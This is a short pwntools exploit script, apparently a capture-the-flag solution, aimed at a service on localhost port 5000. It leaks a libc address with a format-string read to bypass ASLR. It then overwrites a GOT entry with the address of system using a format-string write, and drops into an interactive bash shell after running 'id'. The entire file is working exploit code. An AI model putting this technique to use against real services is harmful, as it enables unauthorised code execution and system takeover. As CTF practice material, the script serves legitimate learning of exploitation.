from pwn import *

context.clear(arch = 'amd64')

conn = remote("localhost", 5000)
#conn = process("../../public/run")
#context.terminal = ["alacritty", "-e", "bash", "-c"]
#gdb.attach(conn)

# bypass ASLR: leak libc base
conn.sendline(b'%29$p')
leak = int(conn.recvline(), 16)
libc_base = leak - 0x25E08
log.info('libc_base: 0x%x', libc_base)

# printf: 0x58BC0
libc_system = libc_base + 0x51C30

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    conn.sendline(payload)
    res = conn.recv()
    log.info('received %r', res)
    return res

format_string = FmtStr(execute_fmt=send_payload)
# writing just 2 bytes is not 100% reliable, but generates small enough payload
format_string.write(0x404008, p64(libc_system)[:2])
format_string.execute_writes()

conn.sendline(b"/bin/bash")
conn.sendline(b"id")

conn.interactive()
